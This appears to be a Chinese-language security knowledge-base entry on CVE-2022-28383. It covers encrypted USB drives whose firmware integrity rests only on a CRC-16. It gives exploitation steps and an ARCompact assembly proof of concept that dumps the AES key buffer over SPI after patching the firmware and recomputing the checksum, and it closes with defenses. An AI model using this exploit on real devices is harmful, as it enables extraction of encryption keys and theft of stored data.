---
id: iot-hardware-spi-firmware-crc16-patch-aes-key-extract
title: 硬件加密 USB 盘固件完整性仅 CRC-16：SPI 固件改码重算校验并读出 AES 密钥缓冲
type: scenario
domain: iot
path: iot/hardware
technique: firmware-crc16-integrity-bypass
aliases:
- 固件 CRC16 校验绕过
- SPI flash 固件注入
- ARCompact 固件
- AES 密钥缓冲读出
tags:
- iot
- hardware
- firmware
- spi
- crc16
- arcompact
- aes
- secure-boot
- usb
cve:
- CVE-2022-28383
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V514
  verified_at: '2026-11-11T11:44:20+08:00'
  notes: 已对照原文与全部17张截图：CVE-2022-28383 经 NVD 确认为固件校验不足；SPI flash 为 XT25F01D、010 Editor 中 CRC-16/CCITT(custom)=8B17 位于映像末尾、更新输出 Computed 0x03F5 与 Stored 0x8B17、ARCompact/ARC600 工具链、SPI 寄存器 0x400503e0 偏移 0xf1/e3/e2/e1、密钥缓冲 0x40056904 起 32 字节均一致（原文正文另写作 0x40046904，代码与截图为准，属原文不一致）。无 PoC 输出截图但代码与 CRC 修补流程完整，保留。dedup 无同链候选；硬件产品原文无固件版本，不设 affected_versions。
---

## 一句话结论

USB-SATA 桥接控制器的固件存放在外部 SPI flash 中，完整性验证只是一个 16 位 CRC-16（XMODEM）而非数字签名；攻击者修改固件任意代码后重新计算并回填校验和即可烧录，运行期用自定义 ARCompact 代码通过芯片 SPI 邮箱寄存器把内存中的 AES 密钥缓冲原样送出，实现密钥提取与设备行为篡改。

## 原理

- **固件验证仅 CRC-16**：固件映像末尾存放 XMODEM CRC-16 值，装载/更新时只做校验和比对，没有签名、没有不可变可信根。校验和只保证偶然损坏，攻击者改完代码重算 CRC 即可通过。
- **硬件可读写**：控制器的固件在独立 SPI flash 芯片（该设备为 XT25F01D）中，通用编程器（如 XGecu T56）即可转储与烧录，无需在板调试接口。
- **指令集与工具链**：桥接控制器为 ARCompact（ARC600）架构，可用 Ghidra 的 ARCompact 插件反编译；配套 GNU ARC 工具链汇编自定义代码，生成裸二进制后贴入固件映像。
- **SPI 邮箱外发**：固件中原有的 `send_spi_byte` 通过写 `0x400503e0` 附近寄存器（偏移 0xf1/0xe3/0xe2/0xe1）把字节送入 SPI 引擎；自定义代码复用这段逻辑，把关键内存（AES 模式寄存器 `0x4000010c`、AES 密钥缓冲 `0x40056904` 起 32 字节）逐字节从 SPI 输出。
- **为什么成立**：密钥在使用时必须以明文存在于控制器内存中（AES 引擎要读取），只要固件可改且校验可伪造，攻击者就能在设备运行时把这段内存取出来；这等价于绕过了「固件不可篡改」这一可信根假设。

## 触发条件

- 设备固件存放在外部可读写 flash，或可通过更新接口写入（本例为 SPI flash）。
- 固件完整性校验为校验和/CRC 等无密钥方案，或签名公钥可被固件自身改写。
- 可获取固件映像并能反汇编目标架构（ARCompact、ARM 等）。
- 能在设备运行期间捕获对外通信（SPI 引脚/逻辑分析仪）以接收外发数据。

## 利用步骤

1. 拆机定位 SPI flash（如 XT25F01D），用编程器转储固件。
2. 用 Ghidra + 对应架构插件分析，定位固件校验逻辑（末尾 CRC-16/XMODEM）与可复用的 SPI 发送函数。
3. 编写自定义汇编：读取 AES 模式寄存器与密钥缓冲，循环调用 SPI 发送字节例程输出。
4. 用交叉工具链汇编为裸二进制（`--oformat=binary`），贴入固件映像中会被执行的流程（如启动/解锁路径）。
5. 用脚本重算 CRC-16 并回填（例如固件更新工具提示 `Computed CRC-16 (0x03F5) does not match stored CRC-16 (0x8B17)`，修复后写回）。
6. 烧录回 SPI flash，上电/解锁时用逻辑分析仪在 SPI 线上抓取密钥数据。

## PoC

读取密钥缓冲并外发的 ARCompact 汇编片段（复用固件 `send_spi_byte`）：

```asm
__start:
    mov_s   r13, 0x4000010c       ; read AES mode
    ldb_s   r0, [r13]
    bl      send_spi_byte

    mov_s   r13, 0x40056904       ; AES key buffer address
    mov     r14, 32               ; loop count
send_data:
    ldb.ab  r0, [r13, 1]
    bl      send_spi_byte
    sub     r14, r14, 1
    bne     send_data

.align 4
send_spi_byte:
    mov_s   r3, 0x1
    mov_s   r2, 0x400503e0
    stb.di  r3, [r2, 0xf1]
    mov_s   r1, 0xee
    stb.di  r1, [r2, 0xe3]
    stb.di  r3, [r2, 0xe2]
    stb.di  r0, [r2, 0xe1]
send_spi_wait:
    ldb.di  r0, [r2, 0xf1]
    bbit0   r0, 0x0, send_spi_wait
    stb.di  r3, [r2, 0xf1]
    j_s     [blink]
```

CRC-16 修复脚本输出：

```text
[*] Computed CRC-16 (0x03F5) does not match stored CRC-16 (0x8B17).
[*] Successfully updated firmware file
```

## 变体与关联

- 变体：任何以 CRC/checksum 代替签名的固件更新（路由器、摄像头、USB 桥接芯片）都可改码后重算校验；若固件校验公钥写在可改写的 flash 而非 OTP/ROM，签名机制同样可被替换。
- 关联：[[iot-hardware-usb-encrypted-drive-offline-passcode-crack]]（用读出的密钥直接解密存储数据）、[[iot-hardware-stm32-firmware-extraction-uart-flash-swd-rdp]]（另一类固件提取路径）、[[crypto-aes-hardware-encrypted-usb-ecb-pattern-leak]]（同设备 ECB 模式缺陷）。
- 边界：若校验使用设备内不可读密钥的 HMAC/签名，且公钥烧录在 ROM/OTP 无法替换，则本手法不成立。

## 检测与防御

- 修复：固件采用非对称签名验证，公钥固化在 OTP/ROM 且不可改写；校验只作为传输纠错，不作为安全边界。
- 加固：安全启动链（每级校验下一级签名）、关闭或保护调试/编程接口、对 SPI flash 做物理防护。
- 检测：固件更新包签名异常、设备行为改变；取证时比对 SPI flash 内容与官方版本、检查 CRC 与签名并存情况。
